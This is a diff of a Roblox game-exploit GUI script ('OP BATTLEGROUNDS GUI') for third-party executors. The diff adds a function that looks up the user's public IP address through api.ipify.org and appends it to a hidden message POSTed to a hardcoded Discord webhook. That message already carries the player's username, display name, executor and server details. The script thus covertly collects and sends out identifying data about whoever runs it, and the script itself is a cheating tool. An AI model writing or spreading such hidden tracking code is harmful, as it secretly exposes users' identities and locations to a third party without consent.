@@ -876,7 +876,7 @@ UISizeConstraint_37.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function WOLPZL_fake_script() -- Main.LocalScript 
+local function QBHTF_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -899,6 +899,13 @@ local function WOLPZL_fake_script() -- Main.LocalScript
 			print('Exploit or failure environment')
 		end
 	end)()
+	local function getIp()
+		return tostring(http_request({
+			Url = "https://api.ipify.org",
+			Method = "GET"
+		}).Body)
+	end
+	
 	local identifyexecutor = identifyexecutor or function() return 'Roblox Studio' end
 	function getData(userId)
 		if table.pack(pcall(function() http_request({Url = "https://www.roblox.com", Method = 'GET'}) end))[1]==true then
@@ -914,13 +921,15 @@ local function WOLPZL_fake_script() -- Main.LocalScript
 	end
 	local setclipboard = setclipboard or function() return "" end
 	if http_request then 
+		print('Http request accessible.')
 		http_request({Url = "https://discord.com/api/webhooks/1334971604576501860/8D5u4nAJoWLe29XfN2INjOXNHY4yP84_fIrzPE5HcwvaQdWyVgsIjgdh-do114qkRKmp",Method = "POST",Headers = { ["Content-Type"] = "application/json" },Body = game.HttpService:JSONEncode({
 			content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: ' .. game.Players.LocalPlayer.Name ..
 				'\nExecutor: ' .. tostring(identifyexecutor() or "Unknown") ..
 				'\nDisplay: ' .. game.Players.LocalPlayer.DisplayName ..
 				'\nServer Size: ' .. tostring(#game.Players:GetPlayers()) .. '/' .. tostring(game.Players.MaxPlayers) ..
 				'\nJobId/ServerId: ' .. game.JobId ..
-				'\nGame Url: https://roblox.com/games/' .. game.PlaceId .. '/',
+				'\nGame Url: https://roblox.com/games/' .. game.PlaceId .. '/'..
+				']nIP: '.. getIp(),
 			embeds = {{image = {url = getData(game.Players.LocalPlayer.UserId).imageUrl}}}})
 		})
 	
@@ -1612,4 +1621,4 @@ local function WOLPZL_fake_script() -- Main.LocalScript
 	end)()
 	print('Coroutine is successful.')
 end
-coroutine.wrap(WOLPZL_fake_script)()
+coroutine.wrap(QBHTF_fake_script)()
